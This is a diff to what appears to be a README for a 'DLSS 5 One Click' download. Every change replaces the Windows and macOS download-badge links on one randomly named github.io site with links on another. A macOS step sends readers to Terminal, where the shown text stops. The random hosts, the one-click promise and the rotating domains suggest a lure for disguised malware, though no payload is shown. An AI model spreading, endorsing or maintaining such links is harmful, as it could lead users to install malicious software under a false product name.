@@ -15,7 +15,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_DLSS_5_One_Click-F9A825?style=for-the-badge&logo=github)](https://wsxuvucepnao.github.io/dl2/)
+[![Download](https://img.shields.io/badge/⬇_Download_DLSS_5_One_Click-F9A825?style=for-the-badge&logo=github)](https://yauutchdikpr.github.io/win-download/)
 
 </div>
 
@@ -65,9 +65,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://wsxuvucepnao.github.io/dl2/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yauutchdikpr.github.io/win-download/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://wsxuvucepnao.github.io/mac2/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yauutchdikpr.github.io/mac-download/)
 
 </div>
 
@@ -114,7 +114,7 @@
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://wsxuvucepnao.github.io/mac2/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yauutchdikpr.github.io/mac-download/)
 
 1. Click the badge above
 2. Open **Terminal** (`⌘ + Space` → Terminal → Enter)
